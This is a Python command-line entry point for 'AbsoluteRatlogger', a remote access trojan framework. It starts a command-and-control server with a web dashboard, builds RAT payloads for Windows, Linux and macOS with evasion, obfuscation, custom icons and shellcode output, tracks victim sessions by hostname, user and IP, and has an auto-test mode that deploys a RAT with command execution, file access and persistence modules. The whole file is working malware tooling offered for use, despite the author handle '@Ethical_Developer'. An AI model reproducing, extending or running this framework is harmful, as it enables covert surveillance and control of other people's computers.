#!/usr/bin/env python3
"""
AbsoluteRatlogger — main CLI entry point
"""
import sys
import os
import argparse
import asyncio
import json
import time
import subprocess

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)

def cmd_server(args):
    """Start C2 server with integrated REPL."""
    from server.c2_server import C2Server
    server = C2Server(
        host=args.host,
        port=args.port,
        web=args.web,
        web_port=args.web_port,
    )
    try:
        asyncio.run(server.run())
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")

def cmd_generate(args):
    """Generate a RAT payload."""
    from payloads.builder import PayloadBuilder
    builder = PayloadBuilder()

    modules = args.modules.split(",") if args.modules else ["all"]
    evasion = args.evasion.split(",") if args.evasion else []

    builder.build(
        platform=args.platform,
        output=args.output,
        c2_host=args.c2.split(":")[0],
        c2_port=int(args.c2.split(":")[1]),
        modules=modules,
        evasion=evasion,
        icon=args.icon,
        onefile=args.onefile,
        format=args.format,
        obfuscate=args.obfuscate,
    )

def cmd_sessions(args):
    """List sessions from the database."""
    from server.database import Database
    db = Database()
    sessions = db.get_active_sessions()
    if not sessions:
        print("No active sessions.")
        print("Start the server with: python3 absolutespy.py server")
        print("Then run a RAT to connect.")
        return
    print(f"{'ID':<5} {'Hostname':<20} {'OS':<20} {'User':<15} {'IP':<16} {'Last Seen':<20}")
    print("-" * 91)
    for s in sessions:
        print(f"{s['id']:<5} {s['hostname']:<20} {s['os']:<20} {s['user']:<15} {s['ip']:<16} {s.get('last_seen',''):<20}")

def cmd_interact(args):
    """Connect to a running server and interact with a session."""
    print("[*] Interactive mode connects to the running C2 server.")
    print("    If the server is running with the REPL, use it directly.")
    print("    Start the server with: python3 absolutespy.py server")
    print(f"    Then use: sessions → use {args.session_id}")
    # For standalone interactive mode, we'd need a control socket to the server
    # For now, direct users to the integrated REPL

def cmd_list(args):
    """List built payloads."""
    built_dir = os.path.join(BASE_DIR, "payloads", "built")
    if not os.path.isdir(built_dir):
        print("No payloads built yet.")
        print("Generate one: python3 absolutespy.py generate --platform linux --output spy --c2 127.0.0.1:4444")
        return
    print(f"{'Name':<30} {'Size':<12} {'Created':<20}")
    print("-" * 62)
    for f in sorted(os.listdir(built_dir)):
        path = os.path.join(built_dir, f)
        if os.path.isfile(path):
            sz = os.path.getsize(path)
            stat = os.stat(path)
            created = time.strftime("%Y-%m-%d %H:%M", time.localtime(stat.st_ctime))
            if sz > 1024*1024:
                sz_str = f"{sz/1024/1024:.1f} MB"
            elif sz > 1024:
                sz_str = f"{sz/1024:.1f} KB"
            else:
                sz_str = f"{sz} B"
            print(f"{f:<30} {sz_str:<12} {created:<20}")

def cmd_kill(args):
    """Mark a session as terminated."""
    from server.database import Database
    db = Database()
    db.kill_session(args.session_id)
    print(f"Session {args.session_id} marked for termination.")

def cmd_test(args):
    """Auto-test mode: start server + generate RAT + run RAT, all in one command."""
    print("""
╔══════════════════════════════════════════════════════╗
║         AbsoluteRatlogger — Auto Test Mode                 ║
╠══════════════════════════════════════════════════════╣
║  This will:                                          ║
║  1. Generate a Linux RAT                             ║
║  2. Start the C2 server (with web dashboard)         ║
║  3. Run the RAT in background                        ║
║  4. Drop you into the interactive REPL               ║
║                                                      ║
║  Press Ctrl+C to stop everything.                    ║
╚══════════════════════════════════════════════════════╝
""")

    c2 = f"127.0.0.1:{args.port}"

    # Step 1: Generate RAT
    print("[1/4] Generating Linux RAT...")
    from payloads.builder import PayloadBuilder
    builder = PayloadBuilder()
    builder.build(
        platform="linux",
        output="test_spy",
        c2_host="127.0.0.1",
        c2_port=args.port,
        modules=["command_exec", "file_ops", "sysinfo", "process_enum", "persistence"],
        evasion=[],
        onefile=False,
        format="python",
    )

    # Find the generated file
    spy_path = os.path.join(BASE_DIR, "payloads", "built", "test_spy.py")
    if not os.path.exists(spy_path):
        print(f"[!] Generated file not found at {spy_path}")
        return

    print(f"[+] RAT generated: {spy_path}")

    # Step 2: Start RAT in background
    print("[2/4] Starting RAT client in background...")
    rat_proc = subprocess.Popen(
        [sys.executable, spy_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    print(f"[+] RAT PID: {rat_proc.pid}")

    # Wait a moment for it to connect
    import time as _time
    _time.sleep(2)

    # Step 3: Start server (blocking — drops into REPL)
    print(f"[3/4] Starting C2 server on port {args.port}...")
    if args.web:
        print(f"      Web dashboard: http://localhost:{args.web_port}")
    print("[4/4] Dropping into interactive REPL...")
    print("      Type 'sessions' to see the connected RAT, then 'use 1'\n")

    from server.c2_server import C2Server
    server = C2Server(
        host="0.0.0.0",
        port=args.port,
        web=args.web,
        web_port=args.web_port,
    )
    try:
        asyncio.run(server.run())
    except KeyboardInterrupt:
        print("\n[*] Stopping...")
        rat_proc.terminate()
        print("[*] Done.")

def cmd_clean(args):
    """Clean old sessions."""
    from server.database import Database
    db = Database()
    removed = db.clean_old_sessions(max_age_hours=args.max_age)
    print(f"Removed {removed} old sessions.")

def cmd_setup(args):
    """Install all dependencies."""
    print("[*] Installing AbsoluteRatlogger dependencies...\n")
    deps = [
        "pycryptodome",
        "aiohttp",
        "Pillow",
    ]
    for dep in deps:
        print(f"  Installing {dep}...")
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", dep],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            print(f"  [+] {dep} installed")
        else:
            print(f"  [!] {dep} failed: {result.stderr[-200:]}")

    # Check for optional system tools
    print("\n[*] Checking optional system tools...")
    tools = [
        ("scrot", "screen capture (Linux)"),
        ("xclip", "clipboard (Linux)"),
        ("xsel", "clipboard (Linux, alt)"),
    ]
    for tool, desc in tools:
        result = subprocess.run(["which", tool], capture_output=True)
        if result.returncode == 0:
            print(f"  [+] {tool} found — {desc}")
        else:
            print(f"  [ ] {tool} not found — {desc}")
            print(f"      Install: sudo apt install {tool}")

    print("\n[+] Setup complete!")
    print("    Start the server: python3 absolutespy.py server")
    print("    Or run auto-test: python3 absolutespy.py test")

def main():
    parser = argparse.ArgumentParser(
        prog="absolutespy",
        description="AbsoluteRatlogger — Advanced RAT Framework by @Ethical_Developer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  absolutespy setup                           Install dependencies
  absolutespy test                            Auto-test (server + RAT + REPL)
  absolutespy server --port 4444 --web        Start C2 with web dashboard
  absolutespy generate --platform linux --output spy --c2 127.0.0.1:4444 --modules all
  absolutespy sessions                        List active sessions
  absolutespy list                            List built payloads
        """,
    )
    sub = parser.add_subparsers(dest="command")

    # setup
    p_setup = sub.add_parser("setup", help="Install all dependencies")
    p_setup.set_defaults(func=cmd_setup)

    # test
    p_test = sub.add_parser("test", help="Auto-test: generate RAT + start server + interact")
    p_test.add_argument("--port", type=int, default=4444)
    p_test.add_argument("--web", action="store_true", default=True)
    p_test.add_argument("--web-port", type=int, default=8443)
    p_test.set_defaults(func=cmd_test)

    # server
    p_srv = sub.add_parser("server", help="Start C2 server")
    p_srv.add_argument("--host", default="0.0.0.0")
    p_srv.add_argument("--port", type=int, default=4444)
    p_srv.add_argument("--web", action="store_true")
    p_srv.add_argument("--web-port", type=int, default=8443)
    p_srv.set_defaults(func=cmd_server)

    # generate
    p_gen = sub.add_parser("generate", help="Generate a RAT payload")
    p_gen.add_argument("--platform", required=True, choices=["windows", "linux", "macos"])
    p_gen.add_argument("--output", required=True)
    p_gen.add_argument("--c2", required=True, help="host:port")
    p_gen.add_argument("--modules", default="all")
    p_gen.add_argument("--evasion", default="")
    p_gen.add_argument("--icon", default=None)
    p_gen.add_argument("--onefile", action="store_true")
    p_gen.add_argument("--obfuscate", action="store_true")
    p_gen.add_argument("--format", default="executable", choices=["executable", "shellcode", "python"])
    p_gen.set_defaults(func=cmd_generate)

    # sessions
    p_sess = sub.add_parser("sessions", help="List active sessions")
    p_sess.set_defaults(func=cmd_sessions)

    # interact
    p_int = sub.add_parser("interact", help="Interact with a session")
    p_int.add_argument("session_id", type=int)
    p_int.set_defaults(func=cmd_interact)

    # list
    p_list = sub.add_parser("list", help="List built payloads")
    p_list.set_defaults(func=cmd_list)

    # kill
    p_kill = sub.add_parser("kill", help="Kill a session")
    p_kill.add_argument("session_id", type=int)
    p_kill.set_defaults(func=cmd_kill)

    # clean
    p_clean = sub.add_parser("clean", help="Clean old sessions")
    p_clean.add_argument("--max-age", type=int, default=24)
    p_clean.set_defaults(func=cmd_clean)

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        # Print banner
        print("""
   ___         ______    __         _______ __  __
  / _ \\_______/ ____/___/ /__  ____/ / ___// / / /
 / __ / ___/ / /   / __  / _ \\/ __  /\\__ \\/ /_/ /
/ /_/ / /  / /___/ /_/ / ,<  / /_/ /___/ / __  /
\\____/_/   \\____/\\__,_/_/|_| \\__,_//____/_/ /_/

  Author: @Ethical_Developer
  Type 'absolutespy setup' to install deps
  Type 'absolutespy test' for auto-test mode
""")
        sys.exit(1)
    args.func(args)

if __name__ == "__main__":
    main()
